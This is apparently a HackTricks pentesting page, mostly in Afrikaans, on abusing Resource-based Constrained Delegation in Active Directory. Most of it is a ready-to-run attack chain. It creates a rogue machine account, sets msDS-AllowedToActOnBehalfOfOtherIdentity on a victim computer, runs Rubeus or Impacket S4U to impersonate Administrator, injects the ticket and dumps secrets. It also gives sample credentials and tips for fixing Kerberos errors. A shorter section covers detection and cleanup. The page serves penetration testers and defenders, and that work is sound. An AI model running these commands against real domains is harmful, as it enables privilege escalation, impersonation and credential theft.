# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basiese beginsels van Resource-based Constrained Delegation

Dit is soortgelyk aan die basiese [Constrained Delegation](constrained-delegation.md) maar **in plaas daarvan** om toestemming aan 'n **object** te gee om **enige gebruiker teen 'n masjien te impersonate**. Resource-based Constrain Delegation **stel** in **die object wie in staat is om enigiemand teen dit te impersonate**.

In hierdie geval sal die constrained object 'n attribuut hê genaamd _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ met die naam van die gebruiker wat enigiemand teen dit kan impersonate.

Nog 'n belangrike verskil tussen hierdie Constrained Delegation en die ander delegasies is dat enige gebruiker met **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) die **_msDS-AllowedToActOnBehalfOfOtherIdentity_** kan stel (In die ander vorme van Delegation het jy domain admin privs nodig).

### Nuwe konsepte

In Constrained Delegation is gesê dat die **`TrustedToAuthForDelegation`** vlag binne die _userAccountControl_-waarde van die gebruiker nodig is om 'n **S4U2Self.** uit te voer. Maar dit is nie heeltemal waar nie.\
In werklikheid kan jy selfs sonder daardie waarde 'n **S4U2Self** teen enige gebruiker uitvoer as jy 'n **service** is (het 'n SPN), maar as jy die **`TrustedToAuthForDelegation`** het, sal die teruggegewe TGS **Forwardable** wees, en as jy daardie vlag **nie** het nie sal die teruggegewe TGS **nie** **Forwardable** wees.

As die **TGS** wat in **S4U2Proxy** gebruik word **NIE Forwardable** is nie, sal die poging om 'n **basic Constrain Delegation** te misbruik **nie** werk nie. Maar as jy 'n **Resource-Based constrain delegation** probeer benut, sal dit werk.

### Aanvalsstruktuur

> As jy **write equivalent privileges** oor 'n **Computer** account het, kan jy **privileged access** tot daardie masjien verkry.

Stel jou voor die aanvaller het reeds **write equivalent privileges over the victim computer**.

1. Die aanvaller **compromitteer** 'n account wat 'n **SPN** het of **skep een** (“Service A”). Neem kennis dat **any** _Admin User_ sonder enige ander spesiale regte tot 10 Computer objects (**_MachineAccountQuota_**) kan **create** en 'n **SPN** kan stel. Dus kan die aanvaller net 'n Computer object skep en 'n SPN stel.
2. Die aanvaller **abuses its WRITE privilege** oor die slagofferrekenaar (ServiceB) om **resource-based constrained delegation te konfigureer sodat ServiceA enigiemand teen daardie slagofferrekenaar (ServiceB) kan impersonate**.
3. Die aanvaller gebruik Rubeus om 'n **full S4U attack** (S4U2Self en S4U2Proxy) van Service A na Service B uit te voer vir 'n gebruiker **met privileged access to Service B**.
1. S4U2Self (from the SPN compromised/created account): Ask for a **TGS of Administrator to me** (Not Forwardable).
2. S4U2Proxy: Use the **not Forwardable TGS** of the step before to ask for a **TGS** from **Administrator** to the **victim host**.
3. Even if you are using a not Forwardable TGS, as you are exploiting Resource-based constrained delegation, it will work.
4. Die aanvaller kan **pass-the-ticket** en die gebruiker **impersonate** om toegang tot die slagoffer ServiceB te verkry.

Om die _**MachineAccountQuota**_ van die domein te kontroleer kan jy gebruik:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Aanval

### Skep van 'n rekenaarobjek

Jy kan 'n rekenaarobjek binne die domein skep met behulp van **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurasie van Resource-based Constrained Delegation

**Gebruik die activedirectory PowerShell module**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Gebruik powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Uitvoeren van 'n volledige S4U attack (Windows/Rubeus)

Eerstens het ons die nuwe Computer-object geskep met die password `123456`, dus benodig ons die hash van daardie password:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Dit sal die RC4 en AES hashes vir daardie rekening uitdruk.  
Nou kan die attack uitgevoer word:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Jy kan meer tickets vir meer dienste genereer deur net een keer die `/altservice` param van Rubeus te gebruik:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Neem kennis dat gebruikers 'n attribuut het genaamd "**Cannot be delegated**". As 'n gebruiker hierdie attribuut op True gestel is, sal jy hom nie kan impersonate nie. Hierdie eienskap kan in bloodhound gesien word.

### Linux-gereedskap: end-to-end RBCD met Impacket (2024+)

As jy vanaf Linux werk, kan jy die volledige RBCD-ketting uitvoer met die amptelike Impacket-gereedskap:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Aantekeninge
- As LDAP signing/LDAPS afgedwing word, gebruik `impacket-rbcd -use-ldaps ...`.
- Gee voorkeur aan AES keys; baie moderne domeine beperk RC4. Impacket en Rubeus ondersteun albei AES-only flows.
- Impacket kan die `sname` ("AnySPN") vir sommige tools herskryf, maar bekom die korrekte SPN wanneer moontlik (bv., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Toegang verkry

Die laaste opdragreël sal die **complete S4U attack and will inject the TGS** from Administrator to the victim host in **memory**.\\
In hierdie voorbeeld is 'n TGS vir die **CIFS** service van Administrator aangevra, sodat jy toegang tot **C$** sal hê:
```bash
ls \\victim.domain.local\C$
```
### Misbruik verskillende dienskaartjies

Learn about the [**available service tickets here**](silver-ticket.md#available-services).

## Opsporing, oudit en skoonmaak

### Opspoor rekenaars met RBCD gekonfigureer

PowerShell (dekodeer die SD om SIDs op te los):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (read or flush met 'n opdrag):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Skoonmaak / terugstel van RBCD

- PowerShell (maak die attribuut skoon):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos-foute

- **`KDC_ERR_ETYPE_NOTSUPP`**: Dit beteken dat Kerberos geconfigureer is om nie DES of RC4 te gebruik nie en jy voorsien slegs die RC4-hash. Verskaf aan Rubeus ten minste die AES256-hash (of verskaf net die rc4, aes128 en aes256 hashes). Voorbeeld: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Dit beteken dat die tyd op die huidige rekenaar verskil van dié op die DC en Kerberos werk nie behoorlik nie.
- **`preauth_failed`**: Dit beteken dat die gegewe gebruikersnaam + hashes nie werk om aan te meld nie. Jy het dalk vergete om die "$" in die gebruikersnaam te sit toe jy die hashes gegenereer het (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Dit kan beteken:
- Die gebruiker wat jy probeer naboots kan nie toegang tot die verlangde diens kry nie (omdat jy dit nie kan naboots nie of omdat dit nie genoeg privileges het nie)
- Die gevraagde diens bestaan nie (bv. as jy 'n ticket vir winrm versoek maar winrm loop nie)
- Die fakecomputer wat geskep is het sy privileges oor die kwesbare bediener verloor en jy moet dit teruggee.
- Jy misbruik klassieke KCD; onthou RBCD werk met nie-forwardable S4U2Self tickets, terwyl KCD forwardable vereis.

## Aantekeninge, relays en alternatiewe

- Jy kan ook die RBCD SD oor AD Web Services (ADWS) skryf as LDAP gefilter is. Sien:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay-kettings eindig dikwels in RBCD om plaaslike SYSTEM in een stap te bereik. Sien praktiese end-tot-end voorbeelde:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- As LDAP signing/channel binding **gedeaktiveer** is en jy 'n masjienrekening kan skep, kan gereedskap soos **KrbRelayUp** 'n gedwonge Kerberos-auth na LDAP relai, `msDS-AllowedToActOnBehalfOfOtherIdentity` stel vir jou masjienrekening op die teikenrekenaar-object, en onmiddellik **Administrator** naboots via S4U van af-host.

## Verwysings

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (amptelik): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Vinnige Linux cheatsheet met onlangse sintaksis: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
